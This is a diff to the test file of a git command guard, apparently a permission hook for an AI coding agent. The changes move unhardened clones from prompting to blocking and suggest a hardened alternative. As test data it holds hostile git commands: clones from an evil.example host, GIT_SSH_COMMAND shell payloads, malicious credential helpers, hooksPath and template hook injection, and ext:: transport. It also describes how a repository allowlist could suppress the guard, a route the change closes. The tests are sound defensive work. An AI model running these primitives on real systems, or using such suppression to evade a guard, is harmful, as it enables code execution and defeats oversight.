@@ -1390,12 +1390,22 @@ with _pinned_evidence(exposed=False):
         assert "context only" in _r["systemMessage"], _cmd
 print("PASS: git guard - submodule patterns downgrade on a patched host")
 
-# A CLONE keeps its ask on that same patched host, because the CVE half of the
-# finding is not the whole finding: the patch closes two bugs, and closes
-# neither the hook the repository ships nor a clone.recurseSubmodules set in
-# some config level. `--recursive` cannot be hardened by construction, so if it
-# downgraded here while a plain `git clone` asked, a README that asked for
-# `--recursive` would buy LESS friction than one that did not.
+# A RECURSIVE clone keeps its ask on that same patched host, because the CVE
+# half of the finding is not the whole finding: the patch closes two bugs, and
+# closes neither the hook the repository ships nor a clone.recurseSubmodules set
+# in some config level.
+#
+# It stays `ask` rather than joining the plain clone's deny because
+# `--recursive` cannot be hardened by construction -- it contradicts the very
+# flag that would harden it -- so there is no hardened spelling of THIS command
+# to redirect to, and a block with no runnable alternative is a wall. Choosing
+# the two-step instead (hardened clone, read .gitmodules, then `git submodule
+# update --init`) is a judgement call, which is what a prompt is for.
+#
+# The consequence is deliberate and reads backwards: a plain `git clone` now
+# blocks while `--recursive` only prompts, so friction no longer rises with
+# danger. Nothing got looser -- both were `ask` before -- but the ordering is
+# worth seeing in a test rather than discovering in the wild.
 with _pinned_evidence(exposed=False):
     _r = run_git_guard("git clone --recursive https://evil.example/repo")
     assert dec(_r) == "ask"
@@ -1403,12 +1413,17 @@ with _pinned_evidence(exposed=False):
     assert "unhardened_clone" in _reason, _reason
     assert _git_guard.HARDENED_CLONE in _reason, _reason
     assert "https://evil.example/repo" in _reason, _reason
+    # A live prompt must not be described as a block. This is the one path where
+    # `unhardened_clone` still asks, so it is the one that would lie if the
+    # deny framing were assumed from the pattern name rather than threaded.
+    assert "Before approving:" in _reason, _reason
+    assert "This is blocked, not offered for approval" not in _reason, _reason
     # ...and the hardened form is silent on that same host, which is what makes
     # the finding a redirect rather than a toll booth.
     assert run_git_guard(
         "git -c core.hooksPath=/dev/null clone --no-recurse-submodules "
         "https://evil.example/repo") is None
-print("PASS: git guard - a clone asks until it is hardened, patched host or not")
+print("PASS: git guard - recursive clone asks, plain clone blocks, hardened is silent")
 
 # A measured exploit signature outranks both: evidence escalates an ask to a
 # deny even on a patched host, because the signature is the attack itself.
@@ -1443,13 +1458,18 @@ print("PASS: git guard - non-CVE patterns are not downgraded by evidence")
 assert dec(run_git_guard("git config core.hooksPath ./.evil-hooks")) == "ask"
 assert dec(run_git_guard("git config --global core.sshCommand 'sh -c evil'")) == "ask"
 assert dec(run_git_guard("git -c protocol.file.allow=always clone --recursive .")) == "ask"
-assert dec(run_git_guard("git clone --config core.hooksPath=/tmp/e https://x/y")) == "ask"
+# ...but a primitive riding on an UNHARDENED CLONE denies, because the clone
+# alone already does. A live hooksPath pointed at /tmp/e is strictly worse than
+# the bare `git clone <url>` that blocks, so it cannot come out softer.
+assert dec(run_git_guard("git clone --config core.hooksPath=/tmp/e https://x/y")) == "deny"
 assert dec(run_git_guard("git config credential.helper '!f() { evil; }; f'")) == "ask"
 assert dec(run_git_guard("git config filter.lfs.process 'evil'")) == "ask"
 print("PASS: git guard - config RCE primitives")
 
-# GIT_* environment variables run as commands -> ask
-assert dec(run_git_guard("GIT_SSH_COMMAND='sh -c payload' git clone https://x/y")) == "ask"
+# GIT_* environment variables run as commands -> ask, unless the command they
+# are riding on is an unhardened clone, which blocks on its own account.
+assert dec(run_git_guard("GIT_SSH_COMMAND='sh -c payload' git clone https://x/y")) == "deny"
+assert dec(run_git_guard("GIT_SSH_COMMAND='sh -c payload' git fetch origin")) == "ask"
 assert dec(run_git_guard(
     "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.sshCommand "
     "GIT_CONFIG_VALUE_0=payload git pull")) == "ask"
@@ -1480,18 +1500,17 @@ assert run_git_guard("echo context::ext::thing") is None
 assert run_git_guard("git log --grep ext") is None
 print("PASS: git guard - ext:: transport hard-denies, prose does not")
 
-# Every clone that has not disarmed the clone-time execution surface asks, and
-# the reason carries the command to run in its place. This is the only git
-# pattern that sees EVERY clone rather than a flagged minority, so the two
-# things worth pinning are that the redirect exists and that the exit from it
-# works.
+# Every clone that has not disarmed the clone-time execution surface is DENIED
+# and redirected, not prompted. This is the only git pattern that sees EVERY
+# clone rather than a flagged minority, so the things worth pinning are that the
+# block lands, that what it prints instead is actually runnable, and that the
+# exit from it works.
 for _cmd in (
     # Deliberately not a forge host: an allowlisted one would send `assess`
     # out over HTTPS to fetch .gitmodules, and this suite stays offline.
     "git clone https://git.example.org/team/repo.git",
     "git clone git@git.example.org:team/repo.git",
     "git clone ../local/repo",
-    "gh repo clone example/repo",
     "cd /tmp && git clone https://x/y && cd y",
     "git -C /tmp clone https://x/y",
     "sudo git clone https://x/y",
@@ -1501,23 +1520,84 @@ for _cmd in (
     "git clone --no-recurse-submodules https://x/y",
 ):
     _r = run_git_guard(_cmd)
-    assert dec(_r) == "ask", _cmd
-    assert _git_guard.HARDENED_CLONE in \
-        _r["hookSpecificOutput"]["permissionDecisionReason"], _cmd
+    assert dec(_r) == "deny", _cmd
+    _reason = _r["hookSpecificOutput"]["permissionDecisionReason"]
+    assert _git_guard.HARDENED_CLONE in _reason, _cmd
+    # A block must not print an approval checklist for a prompt that never comes.
+    assert "This is blocked, not offered for approval" in _reason, _cmd
+    assert "Before approving:" not in _reason, _cmd
 
-# The exit. Both spellings of the inert hooksPath count, because git applies
-# `clone --config` before anything is checked out.
+# `gh repo clone` is denied through its OWN hardened spelling. Redirecting it to
+# plain `git` would hand back a command that cannot reach a private repo the
+# user's `gh` auth can. `_CLONE_URL` requires the words `git` and `clone` and a
+# URL scheme, so it matches nothing here -- which is how the redirect used to
+# print a literal `<url>` naming no repository at all.
+_r = run_git_guard("gh repo clone example/repo")
+assert dec(_r) == "deny"
+_reason = _r["hookSpecificOutput"]["permissionDecisionReason"]
+assert "gh repo clone example/repo -- --config core.hooksPath=/dev/null" in _reason, _reason
+assert "<url>" not in _reason, _reason
+
+# The exit, in both tools. Both spellings of the inert hooksPath count, because
+# git applies `clone --config` before anything is checked out -- and `--config`
+# is the only one `gh` can pass through `--`.
 assert run_git_guard(
     "git -c core.hooksPath=/dev/null clone --no-recurse-submodules https://x/y") is None
 assert run_git_guard(
     "git -c core.hooksPath=/dev/null clone --no-recu https://x/y") is None
 assert run_git_guard(
     "git clone --config core.hooksPath=/dev/null --no-recurse-submodules https://x/y") is None
+assert run_git_guard(
+    "gh repo clone example/repo -- --config core.hooksPath=/dev/null "
+    "--no-recurse-submodules") is None
+
+# The promotion to deny is what makes this unsuppressible: the dispatcher gates
+# project-allowlist suppression on the DECISION, not on a static pattern list,
+# so a repo shipping `.claude/hook-allowlist.json` cannot wave its own clone
+# through. It could while this was an ask.
+assert _with_allowlist(
+    '{"git_guard": {"suppress_patterns": ["unhardened_clone"]}}',
+    lambda: dec(run_git_guard("git clone https://git.example.org/team/repo.git")),
+) == "deny"
 
 # Hardening one clone must not launder the next one in the same command line.
 assert dec(run_git_guard(
     "git -c core.hooksPath=/dev/null clone --no-recurse-submodules https://a "
-    "&& git clone https://b")) == "ask"
+    "&& git clone https://b")) == "deny"
+
+# The two carve-outs the deny tier needed are exemptions, not bypasses. `--help`
+# is scoped to its own segment, and the subcommand walk resolves through the
+# wrappers `leading_command` already resolves through -- so neither buys a real
+# clone anything. The benign halves live in tests/test_false_positives.py.
+assert dec(run_git_guard("git clone --help && git clone https://evil/x")) == "deny"
+assert dec(run_git_guard("git commit -m 'x' && git clone https://evil/x")) == "deny"
+assert dec(run_git_guard("sudo git clone https://evil/x")) == "deny"
+assert dec(run_git_guard("GIT_TERMINAL_PROMPT=0 git clone https://evil/x")) == "deny"
+
+# A COMPANION finding may not lower the clone's rung. `_first_match` returns the
+# first pattern and `unhardened_clone` is last, so before this every one of
+# these reported the more specific primitive and ASKED -- while the bare
+# `git clone <url>` blocked. Prefixing an env var bought a downgrade.
+for _cmd in (
+    "env GIT_ASKPASS=true git clone https://evil/x",
+    "GIT_ASKPASS=true git clone https://evil/x",
+    'GIT_SSH_COMMAND="sh -c id" git clone https://evil/x',
+    "git -c core.pager=evil clone https://evil/x",
+    "git clone --template=/tmp/evil https://evil/x",
+    "git clone --upload-pack=/tmp/x https://evil/x",
+):
+    assert dec(run_git_guard(_cmd)) == "deny", _cmd
+
+# ...and the escalation is scoped to commands that actually carry a clone. A
+# primitive on its own, or riding along with an already-hardened clone, keeps
+# its ask -- it is a documented git feature with legitimate uses, which is the
+# whole reason it was never on the deny tier.
+assert dec(run_git_guard("git config core.hooksPath ./.evil-hooks")) == "ask"
+assert dec(run_git_guard('GIT_SSH_COMMAND="sh -c id" git fetch origin')) == "ask"
+assert dec(run_git_guard(
+    "git -c core.hooksPath=/dev/null clone --no-recurse-submodules https://a "
+    "&& git config core.pager evil")) == "ask"
+print("PASS: git guard - unhardened clone BLOCKS with a runnable redirect, in both tools")
 
 # ...and disabling hooks is not the same as pointing them somewhere. An inert
 # hooksPath is exempt from git_config_rce_primitive; a live one is not, and a
@@ -1526,7 +1606,10 @@ assert run_git_guard("git -c core.hooksPath=/dev/null status") is None
 assert dec(run_git_guard(
     "git -c core.hooksPath=/dev/null -c core.pager=evil clone "
     "--no-recurse-submodules https://x/y")) == "ask"
-assert dec(run_git_guard("git -c core.hooksPath=./.evil clone https://x/y")) == "ask"
+# A live hooksPath on an UNHARDENED clone denies: the clone half blocks on its
+# own, and the pointed-at hooks dir only makes it worse. The hardened case above
+# stays `ask` because its clone half is exempt, leaving just the second key.
+assert dec(run_git_guard("git -c core.hooksPath=./.evil clone https://x/y")) == "deny"
 
 # A clone named is not a clone run. This pattern matches more commands than any
 # other here, so the position anchor carries proportionally more weight.
@@ -1544,12 +1627,14 @@ print("PASS: git guard - unhardened clone redirects, hardened clone is silent")
 # The template-dir primitive: hooks/ from that directory are copied into every
 # repo created afterwards. The env spelling was already covered; the config key
 # and the flag were the gap.
-assert dec(run_git_guard("git clone --template=/tmp/evil repo")) == "ask"
+# A primitive on a CLONE denies (the clone half blocks on its own); the same
+# primitive on `init` or `fetch` keeps its ask, since there is no clone under it.
+assert dec(run_git_guard("git clone --template=/tmp/evil repo")) == "deny"
 assert dec(run_git_guard("git init --template /tmp/evil")) == "ask"
 assert dec(run_git_guard("git -c init.templateDir=/tmp/evil init")) == "ask"
 assert dec(run_git_guard("git -c core.gitProxy=evil fetch")) == "ask"
-assert dec(run_git_guard("git -c protocol.ext.allow=always clone x")) == "ask"
-assert dec(run_git_guard("git clone --upload-pack=/opt/git-upload-pack srv:r")) == "ask"
+assert dec(run_git_guard("git -c protocol.ext.allow=always clone x")) == "deny"
+assert dec(run_git_guard("git clone --upload-pack=/opt/git-upload-pack srv:r")) == "deny"
 # The control for the four patterns above: none of them may over-match an
 # ordinary clone. It is no longer an allow, because every clone now carries
 # `unhardened_clone`, so it reads the pattern name rather than the rung — which
